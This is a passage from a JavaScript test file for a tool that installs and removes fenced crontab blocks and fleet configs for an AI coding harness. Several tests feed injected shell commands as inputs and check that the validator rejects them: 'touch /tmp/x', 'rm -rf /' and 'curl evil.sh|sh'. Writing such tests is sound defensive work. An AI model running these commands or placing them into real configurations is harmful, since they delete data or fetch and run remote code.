  const haystack = [
    state.crontabText,
    ...state.writeConfigCalls.map((c) => JSON.stringify(c.obj)),
    ...state.logLines,
  ].join("\n");

  assert.equal(haystack.includes(secret), false);
});

test("[#ac-1.3] a45: readConfigFile: a missing file returns null without throwing; an existing file returns its parsed object", () => {
  const enoentErr = new Error("ENOENT: no such file");
  enoentErr.code = "ENOENT";
  const missingDeps = {
    readFileSync: () => {
      throw enoentErr;
    },
  };
  assert.equal(readConfigFile("/home/harness/.claude/harness-crons/missing.json", missingDeps), null);

  const obj = { project: "demo", owner: "acme" };
  const presentDeps = { readFileSync: () => JSON.stringify(obj) };
  assert.deepEqual(readConfigFile("/home/harness/.claude/harness-crons/demo.json", presentDeps), obj);
});

test("[#ac-3.3] a46: uninstallProject: uninstalling an unregistered project on a reaper-only crontab never calls writeCrontab and leaves it byte-identical", () => {
  const initialCrontab = `${reaperBlockFixture()}\n`;
  const { deps, state } = makeMemoryDeps({ initialCrontab });

  uninstallProject("ghost", deps);

  assert.equal(state.writeCrontabCalls.length, 0);
  assert.equal(state.crontabText, initialCrontab);
});

test("[#ac-1.2] a47: validateInstallCoordinates: a control character in a path field throws", () => {
  assert.throws(() => validateInstallCoordinates({ ...BASE_COORDS, projectRoot: "/srv/\ndemo" }), /projectRoot/i);
});

test("[#ac-5.3] a48: removeBlock: a line that merely CONTAINS the fence text (not a standalone fence line) is preserved untouched", () => {
  const decoyLine = '0 1 * * * echo "# >>> harness:demo >>>"';
  const crontabText = `${decoyLine}\n`;
  const result = removeBlock(crontabText, "harness:demo");
  assert.equal(result, crontabText);
});

test("[#ac-1.5] a49: atomicWriteConfig writes JSON.stringify(obj, null, 2) + a trailing newline; the tmp file lives in the same directory as the final path; generateProjectConfig keys are in REQUIRED_CONFIG_FIELDS order", () => {
  const calls = [];
  const deps = {
    mkdirSync: (p) => calls.push({ op: "mkdir", p }),
    writeFileSync: (p, content) => calls.push({ op: "write", p, content }),
    renameSync: (from, to) => calls.push({ op: "rename", from, to }),
    rmSync: () => {},
  };
  const obj = {
    project: "demo",
    owner: "acme",
    repo: "demo-repo",
    projectRoot: "/srv/demo",
    stateDir: "/srv/demo/.claude/state",
    worktreeRoot: "/srv/worktrees",
    homeDir: "/home/harness",
  };
  const finalPath = "/home/harness/.claude/harness-crons/demo.json";

  atomicWriteConfig(finalPath, obj, deps);

  const writeCall = calls.find((c) => c.op === "write");
  assert.equal(writeCall.content, `${JSON.stringify(obj, null, 2)}\n`);
  assert.equal(dirname(writeCall.p), dirname(finalPath));

  const generated = generateProjectConfig(validateInstallCoordinates(BASE_COORDS));
  assert.deepEqual(Object.keys(generated), REQUIRED_CONFIG_FIELDS);
});

// ---------------------------------------------------------------------------------------------
// Bonus: direct coverage of removeFromFleetConfig, the one exported pure fn not otherwise
// exercised directly above (its behavior is covered indirectly via uninstallProject in a22-a25,
// a46, but #ac-3.2 deserves a direct unit test too since it is seam-free per #ac-5.3).
// ---------------------------------------------------------------------------------------------

test("[#ac-3.2] removeFromFleetConfig: drops only the named project's entry, leaving base fields and other entries untouched", () => {
  const fleet = {
    project: "demo",
    owner: "acme",
    repo: "demo-repo",
    projectRoot: "/srv/demo",
    stateDir: "/srv/demo/.claude/state",
    worktreeRoot: "/srv/worktrees",
    homeDir: "/home/harness",
    projects: [
      { project: "demo", projectRoot: "/srv/demo", stateDir: "/srv/demo/.claude/state" },
      { project: "other", projectRoot: "/srv/other", stateDir: "/srv/other/.claude/state" },
    ],
  };

  const result = removeFromFleetConfig(fleet, "demo");

  assert.deepEqual(result.projects, [
    { project: "other", projectRoot: "/srv/other", stateDir: "/srv/other/.claude/state" },
  ]);
  assert.equal(result.owner, "acme");
  assert.equal(result.repo, "demo-repo");
});

// ---------------------------------------------------------------------------------------------
// Dual-review fixes — new guards (FIX 1-5). Additive; the frozen a1-a49 above stay byte-stable.
// ---------------------------------------------------------------------------------------------

test("[#ac-3.2] uninstallProject: with another project still registered the fleet is UPDATED via writeConfig (not deleted) and the reaper is retained", () => {
  const initialCrontab = `${projectBlockFixture("demo")}\n${projectBlockFixture("other")}\n${reaperBlockFixture()}\n`;
  const initialConfigs = {
    [fleetPathFor()]: {
      project: "demo",
      owner: "acme",
      repo: "demo-repo",
      projectRoot: "/srv/demo",
      stateDir: "/srv/demo/.claude/state",
      worktreeRoot: "/srv/worktrees",
      homeDir: "/home/harness",
      projects: [
        { project: "demo", projectRoot: "/srv/demo", stateDir: "/srv/demo/.claude/state" },
        { project: "other", projectRoot: "/srv/other", stateDir: "/srv/other/.claude/state" },
      ],
    },
  };
  const { deps, state } = makeMemoryDeps({ initialCrontab, initialConfigs });

  uninstallProject("demo", deps);

  const fleetWrite = state.writeConfigCalls.find((c) => c.path === fleetPathFor());
  assert.ok(fleetWrite, "remaining project must rewrite the fleet in place");
  assert.equal(fleetWrite.obj.projects.some((p) => p.project === "demo"), false);
  assert.ok(fleetWrite.obj.projects.some((p) => p.project === "other"));
  assert.equal(state.rmSyncCalls.includes(fleetPathFor()), false, "fleet file must NOT be deleted while a project remains");
  assert.ok(state.crontabText.includes("# >>> harness:reaper >>>"));
});

test("[#ac-3.2] uninstallProject: the last project deletes the fleet FILE (rmSync on reaper.json) and removes the reaper block", () => {
  const initialCrontab = `${projectBlockFixture("demo")}\n${reaperBlockFixture()}\n`;
  const initialConfigs = {
    [fleetPathFor()]: {
      project: "demo",
      owner: "acme",
      repo: "demo-repo",
      projectRoot: "/srv/demo",
      stateDir: "/srv/demo/.claude/state",
      worktreeRoot: "/srv/worktrees",
      homeDir: "/home/harness",
      projects: [{ project: "demo", projectRoot: "/srv/demo", stateDir: "/srv/demo/.claude/state" }],
    },
  };
  const { deps, state } = makeMemoryDeps({ initialCrontab, initialConfigs });

  uninstallProject("demo", deps);

  assert.equal(state.writeConfigCalls.length, 0, "fleet must be deleted, never rewritten empty");
  assert.ok(state.rmSyncCalls.includes(fleetPathFor()), "fleet reaper.json path must be rm'd");
  assert.equal(state.crontabText.includes("# >>> harness:reaper >>>"), false);
});

test("[#ac-5.3] removeBlock: an opener fence with no matching closer before EOF is corruption and throws", () => {
  const crontabText = "# >>> harness:demo >>>\n0 */4 * * * node run-cron-a.mjs\n*/5 * * * * backup.sh\n";
  assert.throws(() => removeBlock(crontabText, "harness:demo"), /unterminated harness fence/);
});

test("[#ac-5.3] removeBlock: a CRLF-fenced block (marker lines ending in \\r) is matched and removed; non-fence lines keep their bytes", () => {
  const crontabText =
    "*/1 * * * * before.sh\r\n" +
    "# >>> harness:demo >>>\r\n" +
    "0 */4 * * * node a.mjs\r\n" +
    "# <<< harness:demo <<<\r\n" +
    "*/2 * * * * after.sh\r\n";
  const result = removeBlock(crontabText, "harness:demo");
  assert.equal(result.includes("# >>> harness:demo >>>"), false);
  assert.equal(result, "*/1 * * * * before.sh\r\n*/2 * * * * after.sh\r\n");
});

test("[#ac-1.4/#ac-3.2] listRegisteredProjects: CRLF fence opener lines are matched (trailing \\r tolerated)", () => {
  const crontabText =
    "# >>> harness:demo >>>\r\n0 */4 * * * node a.mjs\r\n# <<< harness:demo <<<\r\n" +
    "# >>> harness:reaper >>>\r\n0 3 * * * node r.mjs\r\n# <<< harness:reaper <<<\r\n";
  assert.deepEqual(listRegisteredProjects(crontabText), ["demo"]);
});

test("[#ac-1.2] validateInstallCoordinates: a shell/cron metacharacter in homeDir throws naming only the field", () => {
  assert.throws(
    () => validateInstallCoordinates({ ...BASE_COORDS, homeDir: "/h;touch /tmp/x" }),
    (err) => {
      assert.match(err.message, /homeDir/);
      assert.equal(err.message.includes(";"), false, "must never echo the raw value");
      return true;
    }
  );
  assert.throws(() => validateInstallCoordinates({ ...BASE_COORDS, homeDir: "/home/har ness" }), /homeDir/);
});

test("[#ac-1.2] uninstallProject: a non-string project (--uninstall with no operand) throws before the slug regex coerces it to \"undefined\"", () => {
  assert.throws(() => uninstallProject(undefined), /invalid project/);
});

// ---------------------------------------------------------------------------------------------
// Second hardening round — render-time cron-safety guard (FIX A), reconcile dedup (FIX B),
// oracle-hardening for the two highest-stakes seams (FIX C). Additive; a1-a49 stay byte-stable.
// ---------------------------------------------------------------------------------------------

test("[#ac-2.3] renderProjectBlock: a scriptDir containing a space (harness checked out under \"/opt/my apps\") throws before rendering a broken cron line", () => {
  assert.throws(
    () =>
      renderProjectBlock({
        project: "demo",
        nodeBin: NODE_BIN,
        scriptDir: "/opt/my apps/core/vps",
        configPath: configPathFor("demo"),
      }),
    /unsafe .* in cron line/
  );
});

test("[#ac-2.3] renderProjectBlock: a nodeBin containing a shell metacharacter (\";\") throws before it can inject into the /bin/sh cron line", () => {
  assert.throws(
    () =>
      renderProjectBlock({
        project: "demo",
        nodeBin: "/usr/bin/node;touch /tmp/x",
        scriptDir: SCRIPT_DIR,
        configPath: configPathFor("demo"),
      }),
    /unsafe nodeBin in cron line/
  );
});

test("[#ac-2.3] renderReaperBlock: a scriptDir with a space and a reaperConfigPath with a metacharacter each throw", () => {
  assert.throws(
    () =>
      renderReaperBlock({
        nodeBin: NODE_BIN,
        scriptDir: "/opt/my apps/core/vps",
        reaperConfigPath: fleetPathFor(),
      }),
    /unsafe script path in cron line/
  );
  assert.throws(
    () =>
      renderReaperBlock({
        nodeBin: NODE_BIN,
        scriptDir: SCRIPT_DIR,
        reaperConfigPath: "/home/harness/.claude/harness-crons/reaper.json;rm -rf /",
      }),
    /unsafe configPath in cron line/
  );
});

test("[#ac-2.3] renderProjectBlock/renderReaperBlock: a fully clean render still succeeds (guard is not over-strict on real absolute paths)", () => {
  assert.doesNotThrow(() => projectBlockFixture("demo"));
  assert.doesNotThrow(() => reaperBlockFixture());
});

test("[#ac-1.3/#ac-1.4] reconcileFleet: a corrupt fleet with two \"other\" entries dedups to exactly one \"other\" plus the current project once", () => {
  const existingFleet = {
    project: "other",
    owner: "acme",
    repo: "demo-repo",
    projectRoot: "/srv/other",
    stateDir: "/srv/other/.claude/state",
    worktreeRoot: "/srv/worktrees",
    homeDir: "/home/harness",
    projects: [
      { project: "other", projectRoot: "/srv/other", stateDir: "/srv/other/.claude/state" },
      { project: "other", projectRoot: "/srv/other-dup", stateDir: "/srv/other-dup/.claude/state" },
    ],
  };
  const snapshot = JSON.parse(JSON.stringify(existingFleet));

  const fleet = reconcileFleet(existingFleet, ["other"], BASE_COORDS);

  const others = fleet.projects.filter((p) => p.project === "other");
  const demos = fleet.projects.filter((p) => p.project === "demo");
  assert.equal(others.length, 1, "duplicate \"other\" entries must collapse to one");
  assert.equal(demos.length, 1, "current project appears exactly once");
  assert.equal(fleet.projects.length, 2);
  // first-appearance order preserved: "other" before the appended current project.
  assert.deepEqual(fleet.projects.map((p) => p.project), ["other", "demo"]);
  assert.deepEqual(existingFleet, snapshot, "reconcileFleet must never mutate its input fleet");
});

test("[#ac-5.1] readCrontab: a status-1 stderr that CONTAINS \"crontab\" but is NOT the benign \"no crontab for \" phrase throws (defends the loose-predicate regression)", () => {
  const fakeSpawnSync = () => ({
    status: 1,
    stdout: "",
    stderr: "crontab: installing new crontab: permission denied\n",
  });
  assert.throws(() => readCrontab({ spawnSync: fakeSpawnSync }), /crontab -l failed/);
});

test("[#ac-5.2] writeCrontab: an already-\\n-terminated input and an empty input each pipe an input ending in EXACTLY one newline (no double newline, no bare-newline surprise)", () => {
  const captured = [];
  const fakeSpawnSync = (cmd, args, opts) => {
    captured.push(opts.input);
    return { status: 0, stdout: "", stderr: "" };
  };

  writeCrontab("x\n", { spawnSync: fakeSpawnSync });
  writeCrontab("", { spawnSync: fakeSpawnSync });

  assert.equal(captured[0], "x\n");
  assert.equal(/\n\n$/.test(captured[0]), false);
  assert.equal(captured[1], "\n");
  assert.equal(/\n\n$/.test(captured[1]), false);
});

test("[#ac-5.4] installProject: an unsafe nodeBin (shell metachar) is rejected at render BEFORE any config or crontab write", () => {
  const { deps, state } = makeMemoryDeps();
  deps.nodeBin = "/usr/bin/node;curl evil.sh|sh";

  assert.throws(() => installProject({ ...BASE_COORDS }, deps), /unsafe/i);
  assert.equal(state.writeConfigCalls.length, 0, "no config may be written when the cron line is unsafe");
  assert.equal(state.writeCrontabCalls.length, 0);
});

// ---------------------------------------------------------------------------------------------
// Review-phase replaces Cron B (run-cron-review.mjs) + reviewEnabled kill switch. Additive; every
// test above stays byte-stable. RED until the implementer replaces run-cron-b.mjs with
// run-cron-review.mjs in renderProjectBlock and adds the reviewEnabled kill-switch field.
// ---------------------------------------------------------------------------------------------

test("[review-phase] a50: renderProjectBlock: the 0 */6 line invokes run-cron-review.mjs and contains NO run-cron-b.mjs line, while the Cron A line stays 0 */4 invoking run-cron-a.mjs (the review phase REPLACES Cron B, not a third line)", () => {
  const block = projectBlockFixture("demo");
  assert.match(block, /0 \*\/6 \* \* \*.*run-cron-review\.mjs/);
  assert.equal(block.includes("run-cron-b.mjs"), false, "run-cron-b.mjs must no longer appear anywhere in the block");
  assert.match(block, /0 \*\/4 \* \* \*.*run-cron-a\.mjs/);

  // The dedicated drain-only cron is a lightweight third line (feed cadence), NOT the retired Cron B.
  assert.match(block, /\*\/3 \* \* \* \*.*run-drain\.mjs/, "a step-3-minute drain-only cron line invokes run-drain.mjs");

  const lines = block.split("\n");
  const cronLines = lines.slice(1, -1); // exclude the two fence lines
  assert.equal(cronLines.length, 3, "exactly 3 project cron lines (Cron A + review + drain), never a run-cron-b line");
});

test("[review-phase] a51: runCli: the review-phase kill switch (\"reviewEnabled\") defaults OFF when no flag is passed, and an explicit --review-enabled false flag resolves to false", async () => {
  const calls = [];
  const baseArgv = [
    "install",
    "--project",
    "demo",
    "--owner",
    "acme",
    "--repo",
    "demo-repo",
    "--project-root",
    "/srv/demo",
    "--state-dir",
    "/srv/demo/.claude/state",
    "--worktree-root",
    "/srv/worktrees",
    "--home-dir",
    "/home/harness",
  ];

  await runCli(baseArgv, { installProject: (inputs) => calls.push(inputs), isTTY: false });
  assert.equal(calls[0].reviewEnabled, false, "the review kill switch must default OFF when absent");

  await runCli([...baseArgv, "--review-enabled", "false"], {
    installProject: (inputs) => calls.push(inputs),
    isTTY: false,
  });
  assert.equal(calls[1].reviewEnabled, false, "an explicit --review-enabled false must resolve to false");
});

test("[review-phase] a52: upsertBlock: an OLD crontab fence containing a run-cron-b.mjs line is REPLACED (not appended) by the new renderProjectBlock output, leaving run-cron-review.mjs and ZERO run-cron-b.mjs lines (no second insecure merge routine left active on upgrade)", () => {
  const oldBlock = [
    "# >>> harness:demo >>>",
    `0 */4 * * * ${NODE_BIN} ${join(SCRIPT_DIR, "run-cron-a.mjs")} --config ${configPathFor("demo")}`,
    `0 */6 * * * ${NODE_BIN} ${join(SCRIPT_DIR, "run-cron-b.mjs")} --config ${configPathFor("demo")}`,
    "# <<< harness:demo <<<",
  ].join("\n");
  const oldCrontab = `*/5 * * * * backup.sh\n${oldBlock}\n`;

  const newBlock = projectBlockFixture("demo");
  const result = upsertBlock(oldCrontab, "harness:demo", newBlock);

  assert.ok(result.includes("run-cron-review.mjs"), "the replaced block must invoke run-cron-review.mjs");
  const bCount = (result.match(/run-cron-b\.mjs/g) || []).length;
  assert.equal(bCount, 0, "no run-cron-b.mjs invocation may survive the upgrade");
  assert.ok(result.includes("backup.sh"), "unrelated crontab lines outside the fence must be preserved");
});

// --- Configurable cadence (chaining latency lever) ---

/**
 * @description Asserts a crontab line begins with a well-formed 5-field cron schedule that a real
 * scheduler would accept: minute/hour/dom/month/dow, each field a valid cron token, minute a plain int.
 */
function assertValidCronSchedulePrefix(line, label) {
  const fields = line.split(/\s+/).slice(0, 5);
  assert.equal(fields.length, 5, `${label}: a cron line must start with 5 schedule fields`);
  for (const f of fields) {
    assert.match(f, /^[0-9*/,-]+$/, `${label}: cron field "${f}" must be a valid cron token`);
  }
  assert.match(fields[0], /^\d+$/, `${label}: the minute field must be a plain integer`);
}

test("cadence: renderProjectBlock defaults to 0 */4 (Cron A) and 0 */6 (review) when no interval is given", () => {
  const block = projectBlockFixture("demo");
  const [, cronA, cronReview] = block.split("\n");
  assert.ok(cronA.startsWith("0 */4 * * * "), "Cron A defaults to every 4h");
  assert.ok(cronReview.startsWith("0 */6 * * * "), "review defaults to every 6h");
  assertValidCronSchedulePrefix(cronA, "default Cron A");
  assertValidCronSchedulePrefix(cronReview, "default review");
});

test("cadence: renderProjectBlock honors custom intervalHoursA / intervalHoursReview", () => {
  const block = renderProjectBlock({
    project: "demo",
    nodeBin: NODE_BIN,
    scriptDir: SCRIPT_DIR,
    configPath: configPathFor("demo"),
    intervalHoursA: 1,
    intervalHoursReview: 2,
  });
  const [, cronA, cronReview] = block.split("\n");
  assert.ok(cronA.startsWith("0 */1 * * * "), "Cron A cadence must reflect intervalHoursA=1");
  assert.ok(cronReview.startsWith("0 */2 * * * "), "review cadence must reflect intervalHoursReview=2");
  assertValidCronSchedulePrefix(cronA, "custom Cron A");
  assertValidCronSchedulePrefix(cronReview, "custom review");
});

test("cadence: renderProjectBlock rejects an out-of-range or non-integer interval (never emits a malformed cron line)", () => {
  const base = { project: "demo", nodeBin: NODE_BIN, scriptDir: SCRIPT_DIR, configPath: configPathFor("demo") };
  assert.throws(() => renderProjectBlock({ ...base, intervalHoursA: 0 }), /intervalHoursA/);
  assert.throws(() => renderProjectBlock({ ...base, intervalHoursA: 25 }), /intervalHoursA/);
  assert.throws(() => renderProjectBlock({ ...base, intervalHoursReview: 1.5 }), /intervalHoursReview/);
});

test("cadence: validateInstallCoordinates carries valid intervals and rejects invalid ones", () => {
  const base = {
    project: "demo",
    owner: "acme",
    repo: "demo-repo",
    projectRoot: "/srv/demo",
    stateDir: "/srv/demo/.claude/state",
    worktreeRoot: "/srv/worktrees",
    homeDir: "/home/harness",
  };
  const coords = validateInstallCoordinates({ ...base, intervalHoursA: 2, intervalHoursReview: 3 });
  assert.equal(coords.intervalHoursA, 2);
  assert.equal(coords.intervalHoursReview, 3);
  assert.throws(() => validateInstallCoordinates({ ...base, intervalHoursA: 0 }), /intervalHoursA/);
  assert.throws(() => validateInstallCoordinates({ ...base, intervalHoursReview: 99 }), /intervalHoursReview/);
  // Absent intervals → coords omits them (default cadence at render time).
  const plain = validateInstallCoordinates(base);
  assert.equal(plain.intervalHoursA, undefined);
  assert.equal(plain.intervalHoursReview, undefined);
});
